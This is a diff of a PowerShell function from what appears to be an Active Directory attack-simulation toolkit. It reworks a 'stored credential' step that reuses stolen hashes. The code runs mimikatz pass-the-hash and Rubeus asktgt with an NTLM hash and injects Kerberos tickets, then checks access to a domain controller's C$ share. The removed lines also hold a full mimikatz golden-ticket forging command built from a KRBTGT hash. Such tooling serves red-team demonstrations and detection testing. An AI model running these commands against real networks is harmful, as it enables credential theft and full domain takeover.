@@ -69,183 +69,167 @@ function Invoke-StoredCredentialAttack {
         $helpNTLM = "Reuse the stored NTLM hash for '$($ntParts[1])' in '$($ntParts[0])'."
     }
 
-    Do {
 
-        If (-not $SkipClearHost) { Clear-Host }
 
-        Write-AS2GoOutput -Type Header -Message "Reuse a Previously Stored Credential"
-        Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
+    If (-not $SkipClearHost) { Clear-Host }
 
-        If ($gtValid) {
-            Write-AS2GoOutput -Type TextMaker -Message "Stored KRBTGT hash data:" -TM "$gtData" -NoExtraLines
-        }
-        If ($ntValid) {
-            Write-AS2GoOutput -Type TextMaker -Message "Stored NTLM   hash data:" -TM "$ntData" -NoExtraLines
-        }
-        write-host "`n"
+    Write-AS2GoOutput -Type Header -Message "Reuse a Previously Stored Credential"
+    Write-AS2GoOutput -Type H1 -Message $((Get-Help (Get-FunctionName)).Functionality)
 
-        $title = "Stored Credential"
-        $message = "Select the stored credential data to reuse."
+    If ($gtValid) {
+        Write-AS2GoOutput -Type TextMaker -Message "Stored KRBTGT hash data:" -TM "$gtData" -NoExtraLines
+    }
+    If ($ntValid) {
+        Write-AS2GoOutput -Type TextMaker -Message "Stored NTLM   hash data:" -TM "$ntData" -NoExtraLines
+    }
+    write-host "`n"
 
-        If ($SafeMode) {
+    $title = "Stored Credential"
+    $message = "Select the stored credential data to reuse."
 
-            $Options = @(
-                [pscustomobject] @{
-                    Label = "&Skip"
-                    Help  = "Skip the Stored Credential simulation."
-                    Value = $Script:No
-                }
-            )
-        }
-        else {
+    If ($SafeMode) {
 
-            $Options = @(
-                [pscustomobject] @{
-                    Label = "&KRBTGT (Golden Ticket)"
-                    Help  = $helpKRBTGT
-                    Value = "KRBTGT"
-                },
-                [pscustomobject] @{
-                    Label = "&NTLM (Pass-the-Hash)"
-                    Help  = $helpNTLM
-                    Value = "NTLM"
-                },
-                [pscustomobject] @{
-                    Label = "&Skip"
-                    Help  = "Skip the Stored Credential simulation."
-                    Value = $Script:No
-                }
-            )
-        }
-
-        $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title
-
-        write-host "`n"
-
-        If ($answer -eq "KRBTGT") {
-
-            $Script:ASFQDN = $gtParts[0]
-            $ShadowUser = $gtParts[1]
-            $Script:ASKrbtgtNtml = $gtParts[2]
-            $groups = $gtParts[3]
-            $Script:ASDomainSID = $gtParts[4]
-
-            Set-ASConfig -Setting "LastGTUser" -Value $ShadowUser
-
-            Write-Host      -NoNewline "  Command: "
-            Write-Highlight -Text ".\mimikatz.exe ", """privilege::debug"" ""kerberos::purge"" ""kerberos::", "golden", " /domain:", $Script:ASFQDN, " /sid:", $Script:ASDomainSID, " /rc4:", $Script:ASKrbtgtNtml, " /user:", $ShadowUser, " /id:", "6666666", " /groups:", $groups, " /ptt"" ""exit"""  `
-                -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
-
-            $answer = Show-DecisionPrompt
-
-            If ($answer -eq $Script:Yes) {
-
-                $TicketLog = "$Script:DefautExfiltrationFolder\$ShadowUser`Load.log"
-                Remove-Item $TicketLog -ErrorAction SilentlyContinue
-
-                Invoke-Command -ScriptBlock { & "$($Script:ASTools)\mimikatz.exe" "log $TicketLog" "privilege::debug" "kerberos::purge" "kerberos::golden /domain:$Script:ASFQDN /sid:$Script:ASDomainSID /rc4:$Script:ASKrbtgtNtml /user:$ShadowUser /id:6666666 /groups:$groups /ptt" "exit" }
-
-                [string]$result = get-content -path $TicketLog | Select-String 'Golden ticket for'
-
-                If ([string]::IsNullOrEmpty($result)) {
-                    Write-AS2GoOutput -Type Error -Message "Failed to submit a Golden ticket for '$ShadowUser'."
-                }
-                else {
-                    Write-AS2GoOutput -Type Success -Message $result
-                }
-
-                Pause
-
-                Write-AS2GoOutput -Type Header -Message "Displays a list of currently cached Kerberos tickets"
-                Write-AS2GoOutput -Type CodeSnippet -Message "Command:"
-
-                Write-Highlight -Text ('      klist') -Color $fgcC
-                Write-Host ""
-                Set-NewColorSchema -NewStage $Script:GoldenTicket
-                $tickets = Get-KlistTicket
-                $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
-                Write-AS2GoOutput -Type Info -Message "Last Ticket"
-                $tickets | Select-Object -Last 1 | Format-List
-                Set-NewColorSchema -NewStage $Script:InitialStart
-                Test-AccessToOneDCPerDomain
+        $Options = @(
+            [pscustomobject] @{
+                Label = "&Skip"
+                Help  = "Skip the Stored Credential simulation."
+                Value = $Script:No
             }
-        
-        }
-        elseif ($answer -eq "NTLM") {
+        )
+    }
+    else {
 
-            $Script:ASFQDN = $ntParts[0]
-            $Global:ASHelpDeskUser = $ntParts[1]
-            $Script:ASPtHntml = $ntParts[2]
-
-            Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
-            Write-Highlight -Text ".\mimikatz.exe ", """privilege::", "debug", """ ""sekurlsa::", "pth", " /user:", $Global:ASHelpDeskUser, " /ntlm:", $Script:ASPtHntml, " /domain:", $Script:ASFQDN, """ ""exit"""   `
-                -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
-
-            $answer = Show-DecisionPrompt
-
-            If ($answer -eq $Script:Yes) {
-
-                $Options = @(
-                    [pscustomobject] @{
-                        Label = "&Mimikatz"
-                        Help  = "YES to proceed"
-                        Value = "Mimikatz"
-                    },
-                    [pscustomobject] @{
-                        Label = "&Rubeus"
-                        Help  = "NO to cancel"
-                        Value = "Rubeus"
-                    },
-                    [pscustomobject] @{
-                        Label = "&Skip"
-                        Help  = "SKIP to bypass this operation"
-                        Value = $Script:Skip
-                    }
-                )
-
-                $Title = "Decision Required"
-                $message = "Please make a decision:"
-                $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title
-
-                If ($answer -eq "Mimikatz") {
-                    Invoke-Command -ScriptBlock {
-                        & "$($Script:ASTools)\mimikatz.exe" `
-                            "privilege::debug" `
-                            "sekurlsa::pth /user:$Global:ASHelpDeskUser /ntlm:$Script:ASPtHntml /domain:$Script:ASFQDN /run:pwsh.exe" `
-                            "exit"
-                    }
-
-                    Write-AS2GoOutput -Type Header -Message "Use the New Command Window"
-                    Write-AS2GoOutput -Type Info -Message "The overpass-the-hash command opened a new command window for the ticket injection."
-                    Write-AS2GoOutput -Type NextCommand -Message "Please run the following command from the new terminal window" -NoExtraLines
-                    Write-AS2GoOutput -Type Command -NoExtraLines -Message "dir $($env:LogonServer)\c$"
-                }
-                elseif ($answer -eq "Rubeus") {
-
-                    Invoke-Command -ScriptBlock {
-                        & "$($Script:ASTools)\Rubeus.exe" asktgt /user:$Global:ASHelpDeskUser /domain:$Script:ASFQDN /rc4:$Script:ASPtHntml /ptt /nowrap
-                    }
-                    Test-AccessToOneDCPerDomain
-                    $tickets = Get-KlistTicket
-                    $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
-                    Write-AS2GoOutput -Type Info -Message "Last Ticket"
-                    $tickets | Select-object -Last 1 | Format-List
-
-                }
-                elseif ($answer -eq $Script:Skip) {
-                }
-
+        $Options = @(
+            [pscustomobject] @{
+                Label = "&KRBTGT (Golden Ticket)"
+                Help  = $helpKRBTGT
+                Value = "KRBTGT"
+            },
+            [pscustomobject] @{
+                Label = "&NTLM (Pass-the-Hash)"
+                Help  = $helpNTLM
+                Value = "NTLM"
+            },
+            [pscustomobject] @{
+                Label = "&Skip"
+                Help  = "Skip the Stored Credential simulation."
+                Value = $Script:No
             }
-        }
-        else {
-            Measure-FunctionRuntime -End -Details $Info
+        )
+    }
+
+    $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title
+
+    write-host "`n"
+
+    If ($answer -eq "KRBTGT") {
+
+
+        Add-Type -AssemblyName System.Windows.Forms
+
+        $dialog = New-Object System.Windows.Forms.OpenFileDialog
+        $dialog.Title = "Select Kirbi file"
+        $dialog.Filter = "Kirbi files (*.kirbi)|*.kirbi"
+        $dialog.Multiselect = $false
+        $dialog.CheckFileExists = $true
+        $dialog.InitialDirectory = $Script:AS2GoTicketsDir
+
+        $dialogResult = $dialog.ShowDialog()
+        if ($dialogResult -ne [System.Windows.Forms.DialogResult]::OK -or [string]::IsNullOrWhiteSpace($dialog.FileName)) {
+            #throw "No Kirbi file selected. Script canceled."
+            Write-Host "  [!] Canceled by user. No kirbi file was selected." -ForegroundColor Yellow
             return
         }
 
-        $title = "REPEAT | Stored Credential"
-        $repeat = Show-DecisionPrompt -Default 1 -Title $title
+        $forgeTicketFile = $dialog.FileName
 
-    } Until ($repeat -eq $Script:No)
+        $domain = $forgeTicketFile.split("@")[-1].Replace(".kirbi", "")
+
+        $server = Get-BestDomainController -Domain $domain
+        $validated = Import-KirbiFile -TicketFile $forgeTicketFile -Service "cifs/$server" -DomainController $server
+
+        Test-AccessToOneDCPerDomain
+
+        $tickets = Get-KlistTicket
+        $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
+        Write-AS2GoOutput -Type Info -Message "Last Ticket"
+        $tickets | Select-Object -Last 1 | Format-List
+
+        if (-not $unattended) { pause }
+
+
+    }
+    elseif ($answer -eq "NTLM") {
+        $Script:ASFQDN = $ntParts[0]
+        $Global:ASHelpDeskUser = $ntParts[1]
+        $Script:ASPtHntml = $ntParts[2]
+
+        Write-AS2GoOutput -Type NextCommand -Message "Command:" -NoExtraLines -NoNewLine
+        Write-Highlight -Text ".\mimikatz.exe ", """privilege::", "debug", """ ""sekurlsa::", "pth", " /user:", $Global:ASHelpDeskUser, " /ntlm:", $Script:ASPtHntml, " /domain:", $Script:ASFQDN, """ ""exit"""   `
+            -Color $fgcC, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS, $fgcV, $fgcS
+
+        $answer = Show-DecisionPrompt
+
+        If ($answer -eq $Script:Yes) {
+
+            $Options = @(
+                [pscustomobject] @{
+                    Label = "&Mimikatz"
+                    Help  = "YES to proceed"
+                    Value = "Mimikatz"
+                },
+                [pscustomobject] @{
+                    Label = "&Rubeus"
+                    Help  = "NO to cancel"
+                    Value = "Rubeus"
+                },
+                [pscustomobject] @{
+                    Label = "&Skip"
+                    Help  = "SKIP to bypass this operation"
+                    Value = $Script:Skip
+                }
+            )
+
+            $Title = "Decision Required"
+            $message = "Please make a decision:"
+            $answer = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title
+
+            If ($answer -eq "Mimikatz") {
+                Invoke-Command -ScriptBlock {
+                    & "$($Script:ASTools)\mimikatz.exe" `
+                        "privilege::debug" `
+                        "sekurlsa::pth /user:$Global:ASHelpDeskUser /ntlm:$Script:ASPtHntml /domain:$Script:ASFQDN /run:pwsh.exe" `
+                        "exit"
+                }
+
+                Write-AS2GoOutput -Type Header -Message "Use the New Command Window"
+                Write-AS2GoOutput -Type Info -Message "The overpass-the-hash command opened a new command window for the ticket injection."
+                Write-AS2GoOutput -Type NextCommand -Message "Please run the following command from the new terminal window" -NoExtraLines
+                Write-AS2GoOutput -Type Command -NoExtraLines -Message "dir $($env:LogonServer)\c$"
+            }
+            elseif ($answer -eq "Rubeus") {
+
+                Invoke-Command -ScriptBlock {
+                    & "$($Script:ASTools)\Rubeus.exe" asktgt /user:$Global:ASHelpDeskUser /domain:$Script:ASFQDN /rc4:$Script:ASPtHntml /ptt /nowrap
+                }
+                Test-AccessToOneDCPerDomain
+                $tickets = Get-KlistTicket
+                $tickets | Format-Table TicketNumber, Client, Server, EncryptionType, EndTime -AutoSize
+                Write-AS2GoOutput -Type Info -Message "Last Ticket"
+                $tickets | Select-object -Last 1 | Format-List
+                if (-not $unattended) { pause }
+
+            }
+            elseif ($answer -eq $Script:Skip) {
+            }
+
+        }
+
+    }
+    else {
+        Measure-FunctionRuntime -End -Details $Info
+        return
+    }
 
     Measure-FunctionRuntime -End -Details $Info
 }
